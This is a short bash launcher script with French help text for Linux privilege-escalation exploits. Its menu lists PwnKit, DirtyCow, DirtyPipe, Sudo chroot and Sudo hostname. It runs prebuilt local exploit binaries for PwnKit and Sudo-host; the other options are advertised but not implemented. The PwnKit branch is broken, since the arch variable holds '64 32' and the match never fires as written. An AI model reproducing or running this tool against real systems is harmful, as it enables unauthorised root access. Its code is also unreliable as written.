#!/bin/bash

arch="64 32"

if [[ "$*" == "-help" ]]; then
    echo "Commande :"
    echo "  -PwnKit64/32   : Exploite PwnKit en architecture 64/32"
    echo "  -DirtyCow      : Exploite DirtyCow"
    echo "  -DirtyPipe     : Exploite DirtyPipe"
    echo "  -Chroot        : Exploite Sudo Chroot"
    echo "  -SudoHost      : Exploite Sudo Hostname "
    echo "  -check         : Verifie si gcc est installer"
    exit 0
fi

# PwnKit
if [[ "$*" == "-PwnKit${arch}" ]]; then
    "${PWD}/exploit/PwnKit/PwnKit${arch}"    
fi

# Sudo-Host
if [[ "$*" == "-SudoHost" ]]; then
    "${PWD}/exploit/Sudo-host/exploit"
fi
